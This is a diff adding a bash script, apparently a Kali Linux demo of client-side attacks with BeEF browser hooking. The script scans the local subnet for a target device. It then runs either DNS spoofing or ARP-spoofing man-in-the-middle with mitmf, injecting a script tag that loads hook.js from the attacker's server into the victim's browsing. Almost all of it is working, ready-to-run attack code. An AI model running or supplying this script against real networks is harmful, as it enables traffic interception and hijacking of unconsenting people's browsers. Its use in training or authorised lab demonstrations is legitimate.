@@ -1,0 +1,51 @@
+#!/bin/bash
+service beef-xss start &
+echo ~~Listing network interfaces \"ifconfig\"
+ifconfig
+read -p "~~Enter the network interface name that will be used: " interfaceName
+echo $interfaceName selected
+echo ~~Getting the network default gateway \"ip route | grep default\"
+defGateway=`ip route | grep default | awk  '{print $3}'`
+echo "~~Scanning for connected devices \"nmap -sn $defGateway/24\""
+nmap -sn $defGateway/24
+read -p "~~Enter target device IP: " ClientIP
+echo "~~Getting the IP of our Kali machine in which our server will be running \"ifconfig | awk 'FNR==2{print $2}'\""
+serverIP=`ifconfig | awk 'FNR==2{print $2}'`
+echo ~~List of options: 
+	echo "	1-DNS Spoofing"
+	echo "	2-MITM Attack with Inject Plugin"
+	read -p "~~Demo(Client-side Attacks/BeEF Browsers Hooking )>: " option
+		case $option in
+		    1)
+			echo '~~Starting the apache2 server \"service apache2 start\"'
+			service apache2 start
+			echo "~~Add an A record (eg: *live.com=$serverIP) to redirect victims from website X to the one running on our machine \"leafpad /etc/mitmf/mitmf.conf\""
+			leafpad /etc/mitmf/mitmf.conf
+			cd /var/www/html/
+			truncate -s 0 index.html
+			echo "<script src="http://$serverIP:3000/hook.js"></script>" >> index.html
+			firefox http://127.0.0.1:3000/ui/panel &
+			echo "~~Starting the DNS spoofing attack \"mitmf --arp --spoof --gateway $defGateway --target $ClientIP -i $interfaceName --dns\""
+			echo "~~Now visit the spoofed website in the target device to hook his/her browser"
+			mitmf --arp --spoof --gateway $defGateway --target $ClientIP -i $interfaceName --dns
+;;
+		    2)		
+			firefox http://127.0.0.1:3000/ui/panel &
+			echo "~~Starting the Inject plugin \"mitmf --arp --spoof --gateway $defGateway --target $ClientIP -i $interfaceName --inject --js-url http://$serverIP:3000/hook.js\""
+			echo '~~Go to the target device and use the browser'
+			mitmf --arp --spoof --gateway $defGateway --target $ClientIP -i $interfaceName --inject --js-url http://$serverIP:3000/hook.js
+			;;
+		  
+		    esac
+
+
+
+
+
+
+
+
+
+
+
+
